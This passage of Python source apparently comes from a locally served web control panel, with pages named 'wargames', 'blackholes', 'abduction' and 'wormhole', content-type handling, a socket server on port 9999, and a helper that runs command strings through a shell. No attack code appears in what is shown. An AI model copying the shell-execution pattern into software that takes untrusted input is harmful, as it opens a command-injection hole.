                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_decrypt_wargames_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/blackholes":
            self.pages["/blackholes"] = self.html_blackholes()
        if page == "/requests":
            if pGet=={}:
                self.pages["/requests"] = self.html_requests()
            else:
                self.save_cfg(pGet)
                self.pages["/requests"] = self.html_request_submit()
        if page == "/abduction":
            self.pages["/abduction"] = self.html_abduction()
        if page == "/stats":
            self.pages["/stats"] = self.html_stats()
        if page == "/wormhole":
            self.pages["/wormhole"] = self.pages["/header"] + "<iframe height='100%' width='100%' src='https://webchat.freenode.net'>"
        ctype = "text/html"
        if page.find(".js") != -1:
            ctype = "application/javascript"
        elif page.find(".txt") != -1:
            ctype = "text/plain"
        elif page.find(".ico") != -1:
            ctype = "image/x-icon"
        elif page.find(".png") != -1:
            ctype = "image/png"
        elif page.find(".css") != -1:
            ctype = "text/css"
        if page in self.pages:
            return dict(run=runcmd, code="200 OK", html=self.pages[page], ctype=ctype)
        return dict(run=runcmd, code="404 Error", html="404 Error<br><br>Page not found...", ctype=ctype)

class Command(object):
    def __init__(self, cmd):
        self.cmd = cmd
        self.process = None

    def run(self, timeout):
        def target():
            self.process = subprocess.Popen(self.cmd, shell=True)
        thread = threading.Thread(target=target)
        thread.start()
        thread.join(timeout)
        if thread.is_alive():
            self.process.terminate()
            thread.join()

if __name__ == "__main__":
    webbrowser.open('http://127.0.0.1:9999', new=1)
    tcpsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    tcpsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    tcpsock.bind((host, port))
    while True:
        tcpsock.listen(4)
        (clientsock, (ip, c_port)) = tcpsock.accept()
        newthread = ClientThread(ip, c_port, clientsock)
        newthread.start()
